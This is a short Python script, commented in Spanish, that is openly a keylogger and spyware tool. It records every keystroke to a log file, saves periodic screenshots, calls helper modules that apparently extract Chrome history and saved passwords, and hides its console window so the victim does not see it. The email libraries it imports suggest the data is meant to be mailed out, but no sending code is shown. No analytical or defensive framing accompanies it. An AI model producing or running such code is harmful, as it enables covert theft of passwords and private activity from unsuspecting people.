from pynput.keyboard import Key, Listener
import logging
import pyautogui
import win32console 
import win32gui 


#librerias para el timer de screenshot 
import time, threading


# librerias para email 
import smtplib 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 

#se importa el historial 
import history 
import passwords 


##screenshots
minutos = int(input(" Ingresa los minutos en que se tomaran las capturas, se actualizara el historial y las contraseñas "))


WAIT_SECONDS = minutos * 60  
def tomascreen():
	pic = pyautogui.screenshot()
	hora=time.ctime()
	#el nombre del screen que sea la  fecha y hora cuando que se corre la funcion  
	pic.save("screenshots.png")
	threading.Timer(WAIT_SECONDS,tomascreen).start()
	#se actualiza el historial y las contraseñas de chrome cada x segundos
	history.historialdechrome()
	passwords.contrachrome()
	win = win32console.GetConsoleWindow()
	win32gui.ShowWindow(win,0)

tomascreen()
##screenshots


##keylogger 
log = "K-lo.txt"
logging.basicConfig(filename=log, level=logging.DEBUG, format='%(asctime)s: %(message)s') 

def on_press(key):
	logging.info(str(key))

with Listener(on_press=on_press) as listener:
	listener.join()
##keylogger 




